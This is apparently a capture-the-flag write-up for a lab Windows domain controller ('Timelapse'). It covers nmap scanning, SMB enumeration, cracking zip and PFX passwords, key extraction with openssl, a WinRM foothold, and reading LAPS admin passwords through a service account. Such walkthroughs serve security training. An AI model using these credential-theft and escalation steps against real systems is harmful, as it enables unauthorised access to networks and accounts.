## Nmap
```
└─$ nmap -sC -sV 10.10.11.152 -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-17 06:48 EDT
Nmap scan report for timelapse.htb (10.10.11.152)
Host is up (0.20s latency).
Not shown: 989 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-17 18:31:51Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h42m39s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-04-17T18:32:05
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.58 seconds

```

## SMB Enumeration
To see which shares are available on a given host, run the following:
`smbclient -L host`

![SMBEnum](https://user-images.githubusercontent.com/8396956/163711059-dd9add63-ceb8-4b52-b746-8f41f525896c.png)

By Enumeration we got `winrm_backup.zip` Which is **password protected**

## Cracking Passwords

For cracking the zip file password i will use `fcrackzip` Tool 

![fcrackzip](https://user-images.githubusercontent.com/8396956/163711472-42cae6aa-0515-4c7f-8e2b-3af1c47ffa7c.png)

Unzipping the file we get `legacyy_dev_auth.pfx` ,  which is **password protected**

>The .pfx file, which is in a PKCS#12 format, contains the SSL certificate (public keys) and the corresponding private keys

For cracking the pfx file i will go with [crackpkcs12](https://github.com/crackpkcs12/crackpkcs12)

![crackpkcs12](https://user-images.githubusercontent.com/8396956/163711715-6101e3b6-6de4-4505-b990-c689b83b636a.png)

## Extracting pfx file

Now let's extract `private key` and `certificate` from the `pfx` file

In order to achieve this 

[We can follow the documentation](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file)


```
$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out drlive.key
$ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out legacy.crt
$ openssl rsa -in drlive.key -out drlive-decrypted.key

```

## Foothold

Now let's connect using `evil-winrm`

![foothold](https://user-images.githubusercontent.com/8396956/163712269-3e56f7cb-e948-4415-91a7-cd85af653810.png)

## Privilege Escalation  
Running **WinPEAS** Tool for this job 
From the result we find `ConsoleHost_History.txt`

![winpeas](https://user-images.githubusercontent.com/8396956/163712784-531ca871-1a08-4f23-995d-37397a08add6.png)

Now we got the `svc_deploy` password

![svcPW](https://user-images.githubusercontent.com/8396956/163713074-88b4b439-38d4-4193-aeb4-977aa729a01d.png)

![svc_](https://user-images.githubusercontent.com/8396956/163713206-25614095-ab1f-41da-90c6-ec86095a3cd6.png)

## Admin user 
We find svc_deploy in `LAPS_Readers` group

![LAPS](https://user-images.githubusercontent.com/8396956/163713277-03c20992-ab74-416c-b3e5-2d20a154fba3.png)

Now search how to extract laps password we will find https://smarthomepursuits.com/export-laps-passwords-powershell/

As the user has access to view `laps password` that is stored in `ms-Mcs-AdmPwd`

Using the following command we get the password :D 

`Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime`



![LAPSPW](https://user-images.githubusercontent.com/8396956/163713490-c9389202-31e1-4b51-b1e4-71e6139282d7.png)


![admin](https://user-images.githubusercontent.com/8396956/163713590-3319b76f-7045-4cd7-bfab-2f88839c3a96.png)


## Rooted
